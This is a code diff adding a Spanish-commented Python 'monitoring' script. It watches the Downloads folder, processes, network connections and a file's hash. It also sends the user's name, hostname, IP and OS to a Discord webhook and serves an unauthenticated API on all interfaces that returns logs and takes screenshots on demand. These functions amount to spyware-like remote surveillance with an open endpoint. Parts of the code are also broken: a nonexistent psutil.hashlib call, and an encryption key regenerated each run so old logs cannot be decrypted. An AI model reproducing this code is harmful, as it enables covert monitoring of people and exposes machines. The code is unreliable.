@@ -1,0 +1,147 @@
+import os
+import sys
+import threading
+import time
+import psutil
+import socket
+import platform
+from datetime import datetime
+from flask import Flask, request, jsonify
+from PIL import ImageGrab
+from cryptography.fernet import Fernet
+import requests
+
+# Webhook de Discord (pon aquí tu URL)
+WEBHOOK_URL = "AQUI_TU_WEBHOOK"
+
+# --- CONFIGURACIÓN ---
+CARPETA_VIGILADA = os.path.expanduser("~/Downloads")
+LOGS_PATH = os.path.expanduser("~/logs_cifrados.enc")
+ARCHIVO_IMPORTANTE = os.path.expanduser("~/Documents/archivo.txt")
+
+# --- CIFRADO LOGS ---
+key = Fernet.generate_key()
+cipher = Fernet(key)
+
+def guardar_log(texto):
+    encrypted = cipher.encrypt(texto.encode())
+    with open(LOGS_PATH, "ab") as f:
+        f.write(encrypted + b"\n")
+
+def leer_log():
+    if not os.path.exists(LOGS_PATH):
+        return []
+    logs = []
+    with open(LOGS_PATH, "rb") as f:
+        for line in f:
+            try:
+                logs.append(cipher.decrypt(line).decode())
+            except:
+                logs.append("[ERROR DECIFRANDO]")
+    return logs
+
+# --- FLASK API ---
+app = Flask(__name__)
+
+@app.route('/logs', methods=['GET'])
+def ver_logs():
+    return jsonify(leer_log())
+
+@app.route('/captura', methods=['GET'])
+def tomar_captura():
+    img = ImageGrab.grab()
+    ruta = os.path.expanduser("~/captura.png")
+    img.save(ruta)
+    guardar_log(f"Captura de pantalla guardada: {ruta}")
+    return jsonify({"ruta": ruta})
+
+# --- MONITOREO DE ARCHIVOS ---
+archivos_previos = set(os.listdir(CARPETA_VIGILADA))
+def monitorear_archivos():
+    global archivos_previos
+    while True:
+        actuales = set(os.listdir(CARPETA_VIGILADA))
+        nuevos = actuales - archivos_previos
+        eliminados = archivos_previos - actuales
+        if nuevos:
+            guardar_log(f"Nuevos archivos: {list(nuevos)}")
+        if eliminados:
+            guardar_log(f"Archivos eliminados: {list(eliminados)}")
+        archivos_previos = actuales
+        time.sleep(10)
+
+# --- MONITOREO DE PROCESOS ---
+def monitorear_procesos():
+    while True:
+        procesos = [p.info['name'] for p in psutil.process_iter(['name'])]
+        guardar_log(f"Procesos activos: {procesos}")
+        time.sleep(30)
+
+# --- MONITOREO DE RECURSOS DEL SISTEMA ---
+def monitorear_recursos():
+    while True:
+        cpu = psutil.cpu_percent()
+        ram = psutil.virtual_memory().percent
+        disco = psutil.disk_usage('/').percent
+        guardar_log(f"CPU: {cpu}%, RAM: {ram}%, Disco: {disco}%")
+        time.sleep(30)
+
+# --- MONITOREO DE CONEXIONES DE RED ---
+def monitorear_red():
+    while True:
+        conexiones = psutil.net_connections()
+        ips = [c.raddr.ip for c in conexiones if c.raddr]
+        guardar_log(f"Conexiones de red: {ips}")
+        time.sleep(60)
+
+# --- HASH DE ARCHIVO IMPORTANTE ---
+def hash_archivo(ruta):
+    if not os.path.exists(ruta):
+        return None
+    with open(ruta, "rb") as f:
+        return psutil.hashlib.sha256(f.read()).hexdigest()
+
+def verificar_integridad():
+    hash_inicial = hash_archivo(ARCHIVO_IMPORTANTE)
+    while True:
+        hash_actual = hash_archivo(ARCHIVO_IMPORTANTE)
+        if hash_actual and hash_actual != hash_inicial:
+            guardar_log(f"¡El archivo {ARCHIVO_IMPORTANTE} fue modificado!")
+        time.sleep(60)
+
+# --- INFORMACIÓN DEL USUARIO ---
+def obtener_info_usuario():
+    nombre = os.getlogin()
+    equipo = socket.gethostname()
+    sistema = platform.system() + " " + platform.release()
+    ruta_actual = os.path.abspath(__file__)
+    hora_actual = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    try:
+        ip_local = socket.gethostbyname(socket.gethostname())
+    except:
+        ip_local = "N/A"
+    mensaje = (
+        f"Usuario: {nombre}\n"
+        f"Equipo: {equipo}\n"
+        f"IP local: {ip_local}\n"
+        f"Sistema: {sistema}\n"
+        f"Ruta: {ruta_actual}\n"
+        f"Hora: {hora_actual}\n"
+        f"Accede a la API Flask en http://{ip_local}:5000 desde otro dispositivo"
+    )
+    guardar_log(mensaje)
+    if WEBHOOK_URL != "AQUI_TU_WEBHOOK":
+        try:
+            requests.post(WEBHOOK_URL, json={"content": mensaje})
+        except:
+            pass
+
+# --- MAIN ---
+if __name__ == '__main__':
+    obtener_info_usuario()
+    threading.Thread(target=monitorear_archivos, daemon=True).start()
+    threading.Thread(target=monitorear_procesos, daemon=True).start()
+    threading.Thread(target=monitorear_recursos, daemon=True).start()
+    threading.Thread(target=monitorear_red, daemon=True).start()
+    threading.Thread(target=verificar_integridad, daemon=True).start()
+    app.run(host='0.0.0.0', port=5000)
